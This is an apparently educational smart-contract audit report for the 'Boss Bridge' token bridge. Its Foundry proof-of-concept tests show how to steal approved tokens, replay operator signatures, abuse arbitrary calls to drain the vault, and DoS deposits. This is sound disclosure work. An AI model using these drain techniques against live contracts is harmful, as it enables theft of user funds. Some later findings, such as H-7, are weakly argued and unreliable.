---
title: Boss Bridge Audit Report
author: YOUR_NAME_HERE
date: September 1, 2023
header-includes:
  - \usepackage{titling}
  - \usepackage{graphicx}
---
\begin{titlepage}
    \centering
    \begin{figure}[h]
        \centering
        \includegraphics[width=0.5\textwidth]{logo.pdf} 
    \end{figure}
    \vspace*{2cm}
    {\Huge\bfseries Boss Bridge Initial Audit Report\par}
    \vspace{1cm}
    {\Large Version 0.1\par}
    \vspace{2cm}
    {\Large\itshape Cyfrin.io\par}
    \vfill
    {\large \today\par}
\end{titlepage}

\maketitle

# Boss Bridge Audit Report

Prepared by: YOUR_NAME_HERE
Lead Auditors: 

- [YOUR_NAME_HERE](enter your URL here)

Assisting Auditors:

- None

# Table of contents
<details>

<summary>See table</summary>

- [Boss Bridge Audit Report](#boss-bridge-audit-report)
- [Table of contents](#table-of-contents)
- [About YOUR\_NAME\_HERE](#about-your_name_here)
- [Disclaimer](#disclaimer)
- [Risk Classification](#risk-classification)
- [Audit Details](#audit-details)
  - [Scope](#scope)
- [Protocol Summary](#protocol-summary)
  - [Roles](#roles)
- [Executive Summary](#executive-summary)
  - [Issues found](#issues-found)
- [Findings](#findings)
  - [High](#high)
    - [\[H-1\] Users who give tokens approvals to `L1BossBridge` may have those assest stolen](#h-1-users-who-give-tokens-approvals-to-l1bossbridge-may-have-those-assest-stolen)
    - [\[H-2\] Calling `depositTokensToL2` from the Vault contract to the Vault contract allows infinite minting of unbacked tokens](#h-2-calling-deposittokenstol2-from-the-vault-contract-to-the-vault-contract-allows-infinite-minting-of-unbacked-tokens)
    - [\[H-3\] Lack of replay protection in `withdrawTokensToL1` allows withdrawals by signature to be replayed](#h-3-lack-of-replay-protection-in-withdrawtokenstol1-allows-withdrawals-by-signature-to-be-replayed)
    - [\[H-4\] `L1BossBridge::sendToL1` allowing arbitrary calls enables users to call `L1Vault::approveTo` and give themselves infinite allowance of vault funds](#h-4-l1bossbridgesendtol1-allowing-arbitrary-calls-enables-users-to-call-l1vaultapproveto-and-give-themselves-infinite-allowance-of-vault-funds)
    - [\[H-5\] `CREATE` opcode does not work on zksync era](#h-5-create-opcode-does-not-work-on-zksync-era)
    - [\[H-6\] `L1BossBridge::depositTokensToL2`'s `DEPOSIT_LIMIT` check allows contract to be DoS'd](#h-6-l1bossbridgedeposittokenstol2s-deposit_limit-check-allows-contract-to-be-dosd)
    - [\[H-7\] The `L1BossBridge::withdrawTokensToL1` function has no validation on the withdrawal amount being the same as the deposited amount in `L1BossBridge::depositTokensToL2`, allowing attacker to withdraw more funds than deposited](#h-7-the-l1bossbridgewithdrawtokenstol1-function-has-no-validation-on-the-withdrawal-amount-being-the-same-as-the-deposited-amount-in-l1bossbridgedeposittokenstol2-allowing-attacker-to-withdraw-more-funds-than-deposited)
    - [\[H-8\] `TokenFactory::deployToken` locks tokens forever](#h-8-tokenfactorydeploytoken-locks-tokens-forever)
  - [Medium](#medium)
    - [\[M-1\] Withdrawals are prone to unbounded gas consumption due to return bombs](#m-1-withdrawals-are-prone-to-unbounded-gas-consumption-due-to-return-bombs)
  - [Low](#low)
    - [\[L-1\] Lack of event emission during withdrawals and sending tokesn to L1](#l-1-lack-of-event-emission-during-withdrawals-and-sending-tokesn-to-l1)
    - [\[L-2\] `TokenFactory::deployToken` can create multiple token with same `symbol`](#l-2-tokenfactorydeploytoken-can-create-multiple-token-with-same-symbol)
    - [\[L-3\] Unsupported opcode PUSH0](#l-3-unsupported-opcode-push0)
  - [Informational](#informational)
    - [\[I-1\] Insufficient test coverage](#i-1-insufficient-test-coverage)

</details>
</br>

# About YOUR_NAME_HERE

<!-- Tell people about you! -->

# Disclaimer

The YOUR_NAME_HERE team makes all effort to find as many vulnerabilities in the code in the given time period, but holds no responsibilities for the findings provided in this document. A security audit by the team is not an endorsement of the underlying business or product. The audit was time-boxed and the review of the code was solely on the security aspects of the solidity implementation of the contracts.

# Risk Classification

|            |        | Impact |        |     |
| ---------- | ------ | ------ | ------ | --- |
|            |        | High   | Medium | Low |
|            | High   | H      | H/M    | M   |
| Likelihood | Medium | H/M    | M      | M/L |
|            | Low    | M      | M/L    | L   |

# Audit Details

**The findings described in this document correspond the following commit hash:**
```
07af21653ab3e8a8362bf5f63eb058047f562375
```

## Scope 

```
#-- src
|   #-- L1BossBridge.sol
|   #-- L1Token.sol
|   #-- L1Vault.sol
|   #-- TokenFactory.sol
```

# Protocol Summary

The Boss Bridge is a bridging mechanism to move an ERC20 token (the "Boss Bridge Token" or "BBT") from L1 to an L2 the development team claims to be building. Because the L2 part of the bridge is under construction, it was not included in the reviewed codebase.

The bridge is intended to allow users to deposit tokens, which are to be held in a vault contract on L1. Successful deposits should trigger an event that an off-chain mechanism is in charge of detecting to mint the corresponding tokens on the L2 side of the bridge.

Withdrawals must be approved operators (or "signers"). Essentially they are expected to be one or more off-chain services where users request withdrawals, and that should verify requests before signing the data users must use to withdraw their tokens. It's worth highlighting that there's little-to-no on-chain mechanism to verify withdrawals, other than the operator's signature. So the Boss Bridge heavily relies on having robust, reliable and always available operators to approve withdrawals. Any rogue operator or compromised signing key may put at risk the entire protocol.

## Roles

- Bridge owner: can pause and unpause withdrawals in the `L1BossBridge` contract. Also, can add and remove operators. Rogue owners or compromised keys may put at risk all bridge funds.
- User: Accounts that hold BBT tokens and use the `L1BossBridge` contract to deposit and withdraw them.
- Operator: Accounts approved by the bridge owner that can sign withdrawal operations. Rogue operators or compromised keys may put at risk all bridge funds. 

# Executive Summary

## Issues found

| Severity | Number of issues found |
| -------- | ---------------------- |
| High     | 8                      |
| Medium   | 1                      |
| Low      | 3                      |
| Info     | 1                      |
| Gas      | 0                      |
| Total    | 13                     |

# Findings

## High 

### [H-1] Users who give tokens approvals to `L1BossBridge` may have those assest stolen

The `depositTokensToL2` function allows anyone to call it with a `from` address of any account that has approved tokens to the bridge.

As a consequence, an attacker can move tokens out of any victim account whose token allowance to the bridge is greater than zero. This will move the tokens into the bridge vault, and assign them to the attacker's address in L2 (setting an attacker-controlled address in the `l2Recipient` parameter).

As a PoC, include the following test in the `L1BossBridge.t.sol` file:

```javascript
function testCanMoveApprovedTokensOfOtherUsers() public {
    vm.prank(user);
    token.approve(address(tokenBridge), type(uint256).max);

    uint256 depositAmount = token.balanceOf(user);
    vm.startPrank(attacker);
    vm.expectEmit(address(tokenBridge));
    emit Deposit(user, attackerInL2, depositAmount);
    tokenBridge.depositTokensToL2(user, attackerInL2, depositAmount);

    assertEq(token.balanceOf(user), 0);
    assertEq(token.balanceOf(address(vault)), depositAmount);
    vm.stopPrank();
}
```

Consider modifying the `depositTokensToL2` function so that the caller cannot specify a `from` address.

```diff
- function depositTokensToL2(address from, address l2Recipient, uint256 amount) external whenNotPaused {
+ function depositTokensToL2(address l2Recipient, uint256 amount) external whenNotPaused {
    if (token.balanceOf(address(vault)) + amount > DEPOSIT_LIMIT) {
        revert L1BossBridge__DepositLimitReached();
    }
-   token.transferFrom(from, address(vault), amount);
+   token.transferFrom(msg.sender, address(vault), amount);

    // Our off-chain service picks up this event and mints the corresponding tokens on L2
-   emit Deposit(from, l2Recipient, amount);
+   emit Deposit(msg.sender, l2Recipient, amount);
}
```

### [H-2] Calling `depositTokensToL2` from the Vault contract to the Vault contract allows infinite minting of unbacked tokens

`depositTokensToL2` function allows the caller to specify the `from` address, from which tokens are taken.

Because the vault grants infinite approval to the bridge already (as can be seen in the contract's constructor), it's possible for an attacker to call the `depositTokensToL2` function and transfer tokens from the vault to the vault itself. This would allow the attacker to trigger the `Deposit` event any number of times, presumably causing the minting of unbacked tokens in L2.

Additionally, they could mint all the tokens to themselves. 

As a PoC, include the following test in the `L1TokenBridge.t.sol` file:

```javascript
function testCanTransferFromVaultToVault() public {
    vm.startPrank(attacker);

    // assume the vault already holds some tokens
    uint256 vaultBalance = 500 ether;
    deal(address(token), address(vault), vaultBalance);

    // Can trigger the `Deposit` event self-transferring tokens in the vault
    vm.expectEmit(address(tokenBridge));
    emit Deposit(address(vault), address(vault), vaultBalance);
    tokenBridge.depositTokensToL2(address(vault), address(vault), vaultBalance);

    // Any number of times
    vm.expectEmit(address(tokenBridge));
    emit Deposit(address(vault), address(vault), vaultBalance);
    tokenBridge.depositTokensToL2(address(vault), address(vault), vaultBalance);

    vm.stopPrank();
}
```

As suggested in H-1, consider modifying the `depositTokensToL2` function so that the caller cannot specify a `from` address.

### [H-3] Lack of replay protection in `withdrawTokensToL1` allows withdrawals by signature to be replayed

Users who want to withdraw tokens from the bridge can call the `sendToL1` function, or the wrapper `withdrawTokensToL1` function. These functions require the caller to send along some withdrawal data signed by one of the approved bridge operators.

However, the signatures do not include any kind of replay-protection mechanisn (e.g., nonces). Therefore, valid signatures from any  bridge operator can be reused by any attacker to continue executing withdrawals until the vault is completely drained.

As a PoC, include the following test in the `L1TokenBridge.t.sol` file:

```javascript
function testCanReplayWithdrawals() public {
    // Assume the vault already holds some tokens
    uint256 vaultInitialBalance = 1000e18;
    uint256 attackerInitialBalance = 100e18;
    deal(address(token), address(vault), vaultInitialBalance);
    deal(address(token), address(attacker), attackerInitialBalance);

    // An attacker deposits tokens to L2
    vm.startPrank(attacker);
    token.approve(address(tokenBridge), type(uint256).max);
    tokenBridge.depositTokensToL2(attacker, attackerInL2, attackerInitialBalance);

    // Operator signs withdrawal.
    (uint8 v, bytes32 r, bytes32 s) =
        _signMessage(_getTokenWithdrawalMessage(attacker, attackerInitialBalance), operator.key);

    // The attacker can reuse the signature and drain the vault.
    while (token.balanceOf(address(vault)) > 0) {
        tokenBridge.withdrawTokensToL1(attacker, attackerInitialBalance, v, r, s);
    }
    assertEq(token.balanceOf(address(attacker)), attackerInitialBalance + vaultInitialBalance);
    assertEq(token.balanceOf(address(vault)), 0);
}
```

Consider redesigning the withdrawal mechanism so that it includes replay protection.

### [H-4] `L1BossBridge::sendToL1` allowing arbitrary calls enables users to call `L1Vault::approveTo` and give themselves infinite allowance of vault funds

The `L1BossBridge` contract includes the `sendToL1` function that, if called with a valid signature by an operator, can execute arbitrary low-level calls to any given target. Because there's no restrictions neither on the target nor the calldata, this call could be used by an attacker to execute sensitive contracts of the bridge. For example, the `L1Vault` contract.

The `L1BossBridge` contract owns the `L1Vault` contract. Therefore, an attacker could submit a call that targets the vault and executes is `approveTo` function, passing an attacker-controlled address to increase its allowance. This would then allow the attacker to completely drain the vault.

It's worth noting that this attack's likelihood depends on the level of sophistication of the off-chain validations implemented by the operators that approve and sign withdrawals. However, we're rating it as a High severity issue because, according to the available documentation, the only validation made by off-chain services is that "the account submitting the withdrawal has first originated a successful deposit in the L1 part of the bridge". As the next PoC shows, such validation is not enough to prevent the attack.

To reproduce, include the following test in the `L1BossBridge.t.sol` file:

```javascript
function testCanCallVaultApproveFromBridgeAndDrainVault() public {
    uint256 vaultInitialBalance = 1000e18;
    deal(address(token), address(vault), vaultInitialBalance);

    // An attacker deposits tokens to L2. We do this under the assumption that the
    // bridge operator needs to see a valid deposit tx to then allow us to request a withdrawal.
    vm.startPrank(attacker);
    vm.expectEmit(address(tokenBridge));
    emit Deposit(address(attacker), address(0), 0);
    tokenBridge.depositTokensToL2(attacker, address(0), 0);

    // Under the assumption that the bridge operator doesn't validate bytes being signed
    bytes memory message = abi.encode(
        address(vault), // target
        0, // value
        abi.encodeCall(L1Vault.approveTo, (address(attacker), type(uint256).max)) // data
    );
    (uint8 v, bytes32 r, bytes32 s) = _signMessage(message, operator.key);

    tokenBridge.sendToL1(v, r, s, message);
    assertEq(token.allowance(address(vault), attacker), type(uint256).max);
    token.transferFrom(address(vault), attacker, token.balanceOf(address(vault)));
}
```

Consider disallowing attacker-controlled external calls to sensitive components of the bridge, such as the `L1Vault` contract.



### [H-5] `CREATE` opcode does not work on zksync era

**Impact:** Contract deployment failure on zkSync Era

**Description:**
The `TokenFactory::deployToken` function uses the `CREATE` opcode via inline assembly. However, zkSync Era does not support the `CREATE` opcode in the same way as Ethereum mainnet. This will cause the contract to fail when deployed on zkSync Era.

**Proof of Concept:**

<details>
<summary>Code</summary>

Add the following code to the `TokenFactoryTest.t.sol` file.
```javascript
function testCreateOpcodeZkSyncCompatibility() public {
    // This test demonstrates the issue - will fail on zkSync
    string memory symbol = "TEST";
    bytes memory bytecode = type(L1Token).creationCode;
    
    // On zkSync, this would fail due to CREATE opcode incompatibility
    address tokenAddr = tokenFactory.deployToken(symbol, bytecode);
    
    // On Ethereum mainnet, this passes
    assertTrue(tokenAddr != address(0));
    
    // Note: This test will pass on mainnet but fail on zkSync
    // indicating the compatibility issue
    console2.log("Token deployed at:", tokenAddr);
    console2.log("WARNING: This will fail on zkSync Era due to CREATE opcode");
}
```
</details>

**Recommended Mitigation:**
Consider using zkSync Era compatible deployment methods or use `CREATE2` with proper salt management.

### [H-6] `L1BossBridge::depositTokensToL2`'s `DEPOSIT_LIMIT` check allows contract to be DoS'd
**Impact:** Denial of Service - legitimate users cannot deposit tokens

**Description:**
The `DEPOSIT_LIMIT` check in `depositTokensToL2` uses the vault's current balance plus the deposit amount:

```solidity
if (token.balanceOf(address(vault)) + amount > DEPOSIT_LIMIT) {
    revert L1BossBridge__DepositLimitReached();
}
```

This creates a DoS vulnerability where:
1. An attacker can directly transfer tokens to the vault using `token.transfer(address(vault), amount)`
2. Once the vault balance approaches `DEPOSIT_LIMIT`, legitimate deposit attempts will fail
3. The attacker can effectively lock the bridge by filling the vault to the limit

**Proof of Concept:**
<details>
<summary> Code </summary>
Add the following code to the `L1TokenBridge.t.sol` file.

```javascript
function testDepositLimitDoS() public {
    // Attacker directly transfers tokens to vault to approach limit
    vm.startPrank(attacker);
    deal(address(token), attacker, DEPOSIT_LIMIT);
    token.transfer(address(vault), DEPOSIT_LIMIT - 1 ether);
    vm.stopPrank();

    // Now legitimate users cannot deposit even small amounts
    vm.startPrank(user);
    token.approve(address(tokenBridge), 1 ether);
    vm.expectRevert(L1BossBridge__DepositLimitReached.selector);
    tokenBridge.depositTokensToL2(user, user, 1 ether);
    vm.stopPrank();
}
```
</details>


**Recommended Mitigation:**
Track deposits separately from the vault balance:
```diff
+ uint256 private totalDeposits;

function depositTokensToL2(address from, address l2Recipient, uint256 amount) external whenNotPaused {
-   if (token.balanceOf(address(vault)) + amount > DEPOSIT_LIMIT) {
-        revert L1BossBridge__DepositLimitReached();
-   }
+   if (totalDeposits + amount > DEPOSIT_LIMIT) {
+       revert L1BossBridge__DepositLimitReached();
+   }
+   totalDeposits += amount;
    token.safeTransferFrom(from, address(vault), amount);
    // Our off-chain service picks up this event and mints the corresponding tokens on L2
    emit Deposit(from, l2Recipient, amount);
}
```

### [H-7] The `L1BossBridge::withdrawTokensToL1` function has no validation on the withdrawal amount being the same as the deposited amount in `L1BossBridge::depositTokensToL2`, allowing attacker to withdraw more funds than deposited 

**Impact:** Unlimited fund drainage - attackers can withdraw more than they deposited

**Description:**
The bridge has no mechanism to track individual user deposits vs withdrawals. An attacker can:
1. Deposit a small amount (e.g., 1 token)
2. Get operator signature for withdrawal
3. Modify the withdrawal amount to drain the entire vault
4. The signature verification only checks the operator signature, not the amount relationship

**Vulnerability Flow:**
```solidity
function withdrawTokensToL1(address to, uint256 amount, uint8 v, bytes32 r, bytes32 s) external {
    sendToL1(
        v, r, s,
        abi.encode(
            address(token),
            0,
            abi.encodeCall(IERC20.transferFrom, (address(vault), to, amount))
        )
    );
}
```

The `amount` parameter is controlled by the caller, not validated against their deposit history.

**Proof of Concept:**
<detail>
<summary> Code <summary>
Add the following test in the `L1TokenBridge.t.sol` file :

```javascript
function testWithdrawMoreThanDeposited() public {
    // Setup: vault has 1000 tokens, attacker deposits 1 token
    uint256 vaultBalance = 1000e18;
    uint256 attackerDeposit = 1e18;
    deal(address(token), address(vault), vaultBalance);
    
    vm.startPrank(attacker);
    deal(address(token), attacker, attackerDeposit);
    token.approve(address(tokenBridge), attackerDeposit);
    tokenBridge.depositTokensToL2(attacker, attacker, attackerDeposit);
    
    // Attacker attempts to withdraw entire vault balance
    uint256 withdrawAmount = vaultBalance;
    (uint8 v, bytes32 r, bytes32 s) = 
        _signMessage(_getTokenWithdrawalMessage(attacker, withdrawAmount), operator.key);
    
    tokenBridge.withdrawTokensToL1(attacker, withdrawAmount, v, r, s);
    
    // Attacker successfully withdrew 1000x more than deposited
    assertEq(token.balanceOf(attacker), withdrawAmount);
    assertEq(token.balanceOf(address(vault)), vaultBalance - withdrawAmount);
    vm.stopPrank();
}
```
</details>


**Recommended Mitigation:**
Implement a deposit tracking system:
```diff
+ mapping(address => uint256) private userDeposits;
+ mapping(address => uint256) private userWithdrawals;

function depositTokensToL2(address from, address l2Recipient, uint256 amount) external whenNotPaused {
    // ... existing checks ...
+    userDeposits[from] += amount;
    // ... rest of function ...
}

function withdrawTokensToL1(address to, uint256 amount, uint8 v, bytes32 r, bytes32 s) external {
+   require(userWithdrawals[to] + amount <= userDeposits[to], "Insufficient deposit balance");
+    userWithdrawals[to] += amount;
    // ... rest of function ...
}
```

### [H-8] `TokenFactory::deployToken` locks tokens forever 
**Impact:** Permanent loss of deployed tokens

**Description:**
The `deployToken` function uses inline assembly with the `CREATE` opcode to deploy contracts:

```solidity
function deployToken(string memory symbol, bytes memory contractBytecode) public onlyOwner returns (address addr) {
    assembly {
        addr := create(0, add(contractBytecode, 0x20), mload(contractBytecode))
    }
    s_tokenToAddress[symbol] = addr;
    emit TokenDeployed(symbol, addr);
}
```

**Critical Issues:**
1. **No ownership transfer**: Deployed tokens inherit `msg.sender` as owner (the TokenFactory), not the intended recipient
2. **No access mechanism**: The TokenFactory has no functions to interact with deployed tokens
3. **Permanent lockup**: Tokens become permanently inaccessible as the factory cannot transfer ownership or perform token operations

**Proof of Concept:**
<details>
<summary> Code </summary>
Add the following test in the `TokenFactoryTest.t.sol` file :

```javascript
function testDeployedTokensAreLocked() public {
    // Deploy a token using the factory
    string memory symbol = "TEST";
    bytes memory bytecode = type(L1Token).creationCode;
    
    address tokenAddr = tokenFactory.deployToken(symbol, bytecode);
    IERC20 deployedToken = IERC20(tokenAddr);
    
    // Token exists and has supply
    assertTrue(tokenAddr != address(0));
    assertTrue(deployedToken.totalSupply() > 0);
    
    // But tokens are owned by the factory with no way to access them
    assertEq(deployedToken.balanceOf(address(tokenFactory)), deployedToken.totalSupply());
    
    // Factory owner cannot access the tokens (no function to do so)
    vm.startPrank(tokenFactory.owner());
    // No function exists to transfer tokens out of the factory
    vm.stopPrank();
}
```
</details>

**Recommended Mitigation:**
1. **Add ownership transfer mechanism:**
```solidity
function deployToken(string memory symbol, bytes memory contractBytecode, address newOwner) public onlyOwner returns (address addr) {
    assembly {
        addr := create(0, add(contractBytecode, 0x20), mload(contractBytecode))
    }
    
    // Transfer ownership to specified address
    Ownable(addr).transferOwnership(newOwner);
    
    s_tokenToAddress[symbol] = addr;
    emit TokenDeployed(symbol, addr);
}
```

2. **Or add token recovery mechanism:**
```solidity
function recoverTokens(string memory symbol, address to, uint256 amount) external onlyOwner {
    address tokenAddr = s_tokenToAddress[symbol];
    require(tokenAddr != address(0), "Token not found");
    IERC20(tokenAddr).transfer(to, amount);
}
```



## Medium

### [M-1] Withdrawals are prone to unbounded gas consumption due to return bombs

During withdrawals, the L1 part of the bridge executes a low-level call to an arbitrary target passing all available gas. While this would work fine for regular targets, it may not for adversarial ones.

In particular, a malicious target may drop a [return bomb](https://github.com/nomad-xyz/ExcessivelySafeCall) to the caller. This would be done by returning an large amount of returndata in the call, which Solidity would copy to memory, thus increasing gas costs due to the expensive memory operations. Callers unaware of this risk may not set the transaction's gas limit sensibly, and therefore be tricked to spent more ETH than necessary to execute the call.

If the external call's returndata is not to be used, then consider modifying the call to avoid copying any of the data. This can be done in a custom implementation, or reusing external libraries such as [this one](https://github.com/nomad-xyz/ExcessivelySafeCall).

## Low

### [L-1] Lack of event emission during withdrawals and sending tokesn to L1

Neither the `sendToL1` function nor the `withdrawTokensToL1` function emit an event when a withdrawal operation is successfully executed. This prevents off-chain monitoring mechanisms to monitor withdrawals and raise alerts on suspicious scenarios.

Modify the `sendToL1` function to include a new event that is always emitted upon completing withdrawals.

*Not shown in video*
### [L-2] `TokenFactory::deployToken` can create multiple token with same `symbol`

**Impact:** Confusion, potential loss of funds due to symbol collision

**Description:**
The `deployToken` function allows overwriting existing symbol mappings:

```solidity
function deployToken(string memory symbol, bytes memory contractBytecode) public onlyOwner returns (address addr) {
    assembly {
        addr := create(0, add(contractBytecode, 0x20), mload(contractBytecode))
    }
    s_tokenToAddress[symbol] = addr; // Overwrites existing mapping
    emit TokenDeployed(symbol, addr);
}
```

This can lead to:
1. Loss of reference to previously deployed tokens
2. Confusion about which token address corresponds to a symbol
3. Potential integration issues with off-chain systems

**Proof of Concept:**
<details>
<summary>Code</summary>
Add the following test function in `TokenFactoryTest.t.sol` file :

```javascript
function testCanOverwriteTokenSymbol() public {
    string memory symbol = "TEST";
    bytes memory bytecode = type(L1Token).creationCode;
    
    // Deploy first token
    address firstToken = tokenFactory.deployToken(symbol, bytecode);
    assertEq(tokenFactory.getTokenAddressFromSymbol(symbol), firstToken);
    
    // Deploy second token with same symbol
    address secondToken = tokenFactory.deployToken(symbol, bytecode);
    assertEq(tokenFactory.getTokenAddressFromSymbol(symbol), secondToken);
    
    // First token reference is lost
    assertTrue(firstToken != secondToken);
    assertTrue(firstToken != address(0)); // First token still exists
    // But mapping now points to second token
}
```
</details>

**Recommended Mitigation:**
Add a check to prevent symbol reuse:
```solidity
function deployToken(string memory symbol, bytes memory contractBytecode) public onlyOwner returns (address addr) {
    require(s_tokenToAddress[symbol] == address(0), "Symbol already exists");
    
    assembly {
        addr := create(0, add(contractBytecode, 0x20), mload(contractBytecode))
    }
    s_tokenToAddress[symbol] = addr;
    emit TokenDeployed(symbol, addr);
}
```
### [L-3] Unsupported opcode PUSH0
**Impact:** Deployment failure on older EVM versions

**Description:**
The contract may use the `PUSH0` opcode which is not supported on all EVM versions, potentially causing deployment failures on certain networks.

**Recommended Mitigation:**
Consider using an older Solidity version or ensure deployment targets support the `PUSH0` opcode.


## Informational

### [I-1] Insufficient test coverage

```
Running tests...
| File                 | % Lines        | % Statements   | % Branches    | % Funcs       |
| -------------------- | -------------- | -------------- | ------------- | ------------- |
| src/L1BossBridge.sol | 86.67% (13/15) | 90.00% (18/20) | 83.33% (5/6)  | 83.33% (5/6)  |
| src/L1Vault.sol      | 0.00% (0/1)    | 0.00% (0/1)    | 100.00% (0/0) | 0.00% (0/1)   |
| src/TokenFactory.sol | 100.00% (4/4)  | 100.00% (4/4)  | 100.00% (0/0) | 100.00% (2/2) |
| Total                | 85.00% (17/20) | 88.00% (22/25) | 83.33% (5/6)  | 77.78% (7/9)  |
```

**Recommended Mitigation:** Aim to get test coverage up to over 90% for all files.
